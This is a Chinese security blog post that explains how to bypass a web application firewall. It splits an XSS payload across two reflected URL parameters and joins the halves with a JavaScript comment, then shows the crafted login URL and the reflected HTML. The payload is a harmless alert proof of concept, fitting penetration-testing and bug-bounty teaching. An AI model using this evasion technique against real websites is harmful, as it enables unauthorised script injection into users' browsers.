> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg3NzU1NzIyMg==&mid=2247485097&idx=1&sn=8fe2a206087e4cd0d32cb94a4905630e

#  【XSS Tips】分割构造Payload绕过Waf  
原创 z1  Z1sec   2025-07-11 06:50  
  
   
  
> **免责声明：**  
  
由于传播、利用本公众号Z1sec所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
# 分割绕过Waf  
  
众所周知，
```
alert(111)
```

  
可以弹窗  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bnXduaibt5TFr5Wd5Lk6LSzDibJuZZCibWt6xERqM0BuzRj9OE5qUslFwa9eiaVE6v2c6EpBCmgUBwMGv5ia8iaNQWibw/640?wx_fmt=png&from=appmsg "")  
  
同样的道理，这样也可以  

```
alert`111`
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/bnXduaibt5TFr5Wd5Lk6LSzDibJuZZCibWtiaegPSiaS4SmxJy447vsRLuBAlu1s5mv4UMfQvLQKibJmDYe7NHJ1iagIg/640?wx_fmt=png&from=appmsg "")  
  
这样也行：  

```
(alert)(1)
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/bnXduaibt5TFr5Wd5Lk6LSzDibJuZZCibWt1902vIPVIhYe3rxHvicTuzRGjJboCJm5xM4auva99ibzDZaVHkVr0Y5g/640?wx_fmt=png&from=appmsg "")  
  
这样也可以：  

```
(alert)/*aaaaaaasasas*/(1)
alert/*aaaaaaasasas*/(1)
alert/*aaaaaaasasas*/`1`
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/bnXduaibt5TFr5Wd5Lk6LSzDibJuZZCibWticWWFYsLuZMtzZwmeMQ68DtM73jjcApofXc5JwHRRfKeozUcMuWbwBQ/640?wx_fmt=png&from=appmsg "")  
  
那么在现实情况中，我们可以用这种特性构造payload，将alert和后面的括号分开，以此绕过waf。  
  
给各位爷来个案例：  
  
一个SRC，链接中有两个参数，两个参数都在前端返回，并且可以插入html代码。  

```
http://www.xxx.com/ca/login?error=111&url=222
```

  
返回：  

```
...
<p>
111
</p>

<input type=&#34;hidden&#34; name=&#34;url&#34; value=&#34;222&#34;>
...
```

  
如果单独在error或者url参数上进行xss测试则无法绕过waf，但如果利用前文中的注释的方式将payload分为2块，然后执行，即可绕过waf：  

```
http://www.xxx.com/ca/login?error=111<script>alert/*&url=222*/(11)</script>
```

  
返回：  

```
...
<p>
111<script>alert/*
</p>

<input type=&#34;hidden&#34; name=&#34;url&#34; value=&#34;222*/(11)</script>&#34;>
...
```

  
这样则可以做到bypass绕过waf：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bnXduaibt5TFr5Wd5Lk6LSzDibJuZZCibWtMiaT4aM9swJTMvicGJ3lOObOA1khgLOPOAsLMdFc2tQFBzOjTZMiamXSw/640?wx_fmt=png&from=appmsg "")  
  
  
   
  
